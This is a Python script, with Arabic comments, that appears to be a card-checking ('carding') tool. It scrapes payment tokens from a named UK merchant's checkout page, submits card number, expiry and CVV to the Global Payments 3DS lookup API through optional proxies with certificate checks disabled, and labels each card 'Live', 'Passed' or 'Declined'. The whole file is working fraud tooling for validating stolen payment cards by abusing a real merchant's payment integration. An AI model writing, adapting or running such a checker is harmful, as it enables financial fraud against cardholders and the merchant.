"""
بوابة الدفع: Global 3DS LookUp GP-1
الموقع: pro-align.co.uk
نوع البوابة: Global 3DS LookUp
تدفق الطلبات:
1. GET /checkout/ -> استخراج nonce و merchantId و accountName
2. POST https://apis.globalpay.com/ucp/authentications -> إجراء 3DS lookup وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب nonce و merchantId و accountName."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            "https://pro-align.co.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce_match = re.search(r'"nonce":"(.*?)"', text)
        if not nonce_match:
            nonce_match = re.search(r'globalpayments_params.*?nonce":"(.*?)"', text, re.S)
        nonce = nonce_match.group(1) if nonce_match else ""

        merchant_id_match = re.search(r'"merchantId":"(.*?)"', text)
        merchant_id = merchant_id_match.group(1) if merchant_id_match else ""

        account_name_match = re.search(r'"accountName":"(.*?)"', text)
        account_name = account_name_match.group(1) if account_name_match else ""

        return nonce, merchant_id, account_name
    except Exception as e:
        raise RuntimeError(f"req1_get_tokens failed: {e}") from e


async def req2_3ds_lookup(
    session: aiohttp.ClientSession,
    nonce: str,
    account_name: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إجراء 3DS LookUp عبر Global Payments API."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-GP-Idempotency-Key": str(uuid.uuid4()),
    }
    json_data = {
        "account_name": account_name,
        "channel": "CNP",
        "type": "AUTHENTICATION",
        "payment_method": {
            "entry_mode": "MANUAL",
            "card": {
                "number": cc,
                "expiry_month": mm,
                "expiry_year": yy,
                "cvv": cvv,
            },
        },
        "authentication": {
            "id": nonce,
            "merchant_contact_url": "https://pro-align.co.uk/checkout/",
        },
    }
    try:
        async with session.post(
            "https://apis.globalpay.com/ucp/authentications",
            headers=headers,
            json=json_data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_3ds_lookup failed: {e}") from e


async def process_GP_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global 3DS LookUp GP-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            nonce, merchant_id, account_name = await req1_get_tokens(session, proxy_url)
            res_json = await req2_3ds_lookup(session, nonce, account_name, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = res_json.get("status", "")

    if status == "challenge_required":
        return f"𝐋𝐢𝐯𝐞 ✅ 3DS | {cc}|{mes}|{ano}|{cvv}", "challenge_required"
    elif status == "authenticate_successful":
        return f"𝐏𝐚𝐬𝐬𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "authenticate_successful"
    elif status == "authenticate_rejected":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "authenticate_rejected"
    else:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", f"Status: {status}"
